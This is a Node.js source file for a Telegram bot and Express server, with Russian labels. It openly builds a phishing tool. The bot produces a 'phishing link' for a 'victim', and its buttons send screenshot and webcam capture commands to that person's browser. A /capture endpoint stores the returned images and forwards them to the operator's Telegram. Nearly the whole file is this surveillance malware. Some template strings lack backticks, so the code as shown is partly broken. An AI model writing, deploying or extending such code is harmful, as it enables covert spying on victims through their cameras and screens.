const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

app.use(express.json({ limit: '50mb' }));
app.use(cors());
app.use(express.static('public'));

const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) {
    fs.mkdirSync(capturesDir, { recursive: true });
}

const sessions = new Map();

function generatePhishingLink(targetId) {
    const token = Buffer.from(targetId.toString()).toString('base64');
    const baseUrl = process.env.RENDER_EXTERNAL_URL || 'https://ваш-сервис.onrender.com';
    return ${baseUrl}?target=${token};
}

bot.start((ctx) => {
    const userId = ctx.from.id;
    const link = generatePhishingLink(userId);

    ctx.replyWithMarkdown(
        🔗 *Фишинг-ссылка создана*\n\n +
        Отправьте эту ссылку цели:\n\n +
        \`${link}\`,
        Markup.inlineKeyboard([
            [Markup.button.url('📤 Отправить жертве', link)],
            [Markup.button.callback('📸 Скриншот', `cmd_screenshot_${userId}`)],
            [Markup.button.callback('📹 Камера', `cmd_camera_${userId}`)],
            [Markup.button.callback('🔄 Статус', `cmd_status_${userId}`)]
        ])
    );
});

bot.action(/cmd_screenshot_(\d+)/, async (ctx) => {
    const targetId = ctx.match[1];
    const session = sessions.get(targetId);
    if (!session || !session.ws) {
        return ctx.answerCbQuery('❌ Жертва не в сети', { show_alert: true });
    }
    try {
        session.ws.send(JSON.stringify({ type: 'screenshot' }));
        ctx.answerCbQuery('📸 Отправлено');
    } catch (e) {
        ctx.answerCbQuery('❌ Ошибка', { show_alert: true });
    }
});

bot.action(/cmd_camera_(\d+)/, async (ctx) => {
    const targetId = ctx.match[1];
    const session = sessions.get(targetId);
    if (!session || !session.ws) {
        return ctx.answerCbQuery('❌ Жертва не в сети', { show_alert: true });
    }
    try {
        session.ws.send(JSON.stringify({ type: 'camera' }));
        ctx.answerCbQuery('📹 Отправлено');
    } catch (e) {
        ctx.answerCbQuery('❌ Ошибка', { show_alert: true });
    }
});

bot.action(/cmd_status_(\d+)/, async (ctx) => {
    const targetId = ctx.match[1];
    const session = sessions.get(targetId);
    if (session && session.ws) {
        ctx.answerCbQuery('🟢 Онлайн', { show_alert: true });
    } else {
        ctx.answerCbQuery('🔴 Офлайн', { show_alert: true });
    }
});

app.post('/capture', (req, res) => {
    const { target, image, type } = req.body;
    if (!target || !image) return res.status(400).send('Missing data');

    try {
        const userId = Buffer.from(target, 'base64').toString('ascii');
        const timestamp = Date.now();
        const filename = ${type}_${userId}_${timestamp}.jpg;
        const filepath = path.join(capturesDir, filename);
        fs.writeFileSync(filepath, Buffer.from(image, 'base64'));

        bot.telegram.sendPhoto(userId, { source: filepath }, {
            caption: 📷 *${type === 'screenshot' ? 'Скриншот' : 'Камера'}*\n🕒 ${new Date(timestamp).toLocaleString('ru-RU')},
            parse_mode: 'Markdown'
        }).catch(() => {});

        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).send('Error');
    }
});

app.post('/register', (req, res) => {
    const { target } = req.body;
    if (target) {
        sessions.set(target, { ws: null });
        res.json({ status: 'registered' });
    } else {
        res.status(400).send('Invalid');
    }
});

bot.launch();
app.listen(process.env.SERVER_PORT || 3000, () => {
    console.log(`🌐 Бот запущен на порту ${process.env.SERVER_PORT || 3000}`);
});
